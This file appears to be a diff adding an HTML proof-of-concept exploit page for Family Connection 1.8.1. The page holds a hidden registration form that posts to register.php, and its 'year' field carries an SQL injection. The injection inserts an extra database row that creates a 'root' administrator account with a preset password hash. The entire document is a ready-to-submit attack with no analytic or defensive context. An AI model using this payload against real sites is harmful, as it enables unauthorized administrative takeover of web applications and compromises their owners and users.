@@ -1,0 +1,23 @@
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Family Connection 1.8.1 Create Admin User Exploit&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;p&gt;This exploit creates an user with administrator privileges
+using follows information:&lt;br&gt;
+       Username: root&lt;br&gt;
+       Password: toor&lt;br&gt;
+    &lt;form action=&quot;http://www.example.com/fcms/register.php&quot; method=&quot;POST&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;blabla&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;blabla&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;blabla@blabla.blabla&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;fname&quot; value=&quot;blabla&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;lname&quot; value=&quot;blabla&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;year&quot;
+value=&quot;00-00-000&#039;,&#039;fakeuser&#039;,&#039;fakepassword&#039;), (1, NOW(), &#039;root&#039;,
+&#039;root&#039;, &#039;root@owned.com&#039;, &#039;00-00-00&#039;, &#039;root&#039;,
+&#039;7b24afc8bc80e548d66c4e7ff72171c5&#039;)#&#039;&quot;&gt;
+      &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Exploit&quot;&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
